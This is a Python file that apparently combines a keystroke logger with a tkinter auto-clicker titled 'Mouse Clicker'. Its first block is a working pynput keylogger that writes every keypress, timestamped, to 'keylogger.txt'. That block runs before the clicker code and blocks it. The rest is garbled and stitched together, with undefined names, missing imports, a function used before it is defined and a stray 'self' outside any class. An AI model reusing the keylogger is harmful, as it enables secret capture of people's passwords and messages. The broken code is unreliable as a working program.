import time
import threading
from pynput.keyboard import Listener
import tkinter
import logging
wjpos = "C:\\新建文件夹\\"

logging.basicConfig(filename=(wjpos+"keylogger.txt"),format="%(asctime)s:%(message)s",level=logging.DEBUG)

def press(key):
    logging.info(key)

with Listener(on_press = press) as listener:
    listener.join()

listener = Listener(on_press=key_press)
listener.start()

def key_press(key):
    if key == Key.f8:
        if running:
            running = False
            mouse_click()
        else:
            running = True
            mouse_click()
    elif key == Key.esc:
        listener.stop()


def mouse_click(button, time):
    key_listener = Listener(on_press=self.key_press)
    key_listener.start()
    while running:
        mouse.click(button)
        time.sleep(time)
    key_listener.stop()


class MouseClick:
    def __init__(self, button, time):
        self.mouse = pynput.mouse.Controller()
        self.running = False
        self.time = time
        self.button = button
        self.listener = Listener(on_press=self.key_press)
        self.listener.start()

    def key_press(self, key):
        if key == Key.f8:
            if self.running:
                self.running = False
                self.mouse_click()
            else:
                self.running = True
                self.mouse_click()
        elif key == Key.esc:
            self.listener.stop()

    def mouse_click(self):
        key_listener = Listener(on_press=self.key_press)
        key_listener.start()
        while self.running:
            self.mouse.click(self.button)
            time.sleep(self.time)
        key_listener.stop()


def new_thread_start(button, time):
    MouseClick(button, time)
def start():
    try:
        time = float(input.get())
        if mouse.get() == LEFT:
            button = pynput.mouse.Button.left
        elif mouse.get() == RIGHT:
            button = pynput.mouse.Button.right
        t = threading.Thread(target=new_thread_start, args=(button, time))
        t.setDaemon(True)
        t.start()
    except:
        print("ERROR!")



root = Tk()
root.title('Mouse Clicker')
root.geometry('400x290')

mouse = IntVar()
lab1 = Label(root, text='Mouse Button', font=("微软雅黑", 11), fg="gray")
lab1.place(relx=0.05, y=10, relwidth=0.4, height=30)
r1 = Radiobutton(root, text='LEFT', font=("微软雅黑", 10), value=0, variable=mouse)
r1.place(relx=0.05, y=40, relwidth=0.15, height=30)
r2 = Radiobutton(root, text='RIGHT', font=("微软雅黑", 10), value=1, variable=mouse)
r2.place(relx=0.2, y=40, relwidth=0.3, height=30)

lab2 = Label(root, text='Time Interval', font=("微软雅黑", 11), fg="gray")
lab2.place(relx=0.55, y=10, relwidth=0.4, height=30)
input = Entry(root, font=("微软雅黑", 10))
input.place(relx=0.55, y=40, relwidth=0.4, height=30)

label3 = Label(root, text='---------- Current State and Instruction ----------', font=("微软雅黑", 8), fg="gray")
label3.place(relx=0.05, y=90, relwidth=0.9, height=20)
state = Text(root, font=("微软雅黑", 10))
state.place(relx=0.05, y=110, relwidth=0.9, height=120)

btn_start = Button(root, text='START', font=("微软雅黑", 12), fg="white", bg="gray", command=start)
btn_start.place(relx=0.3, y=240, relwidth=0.4, height=30)

root.mainloop()
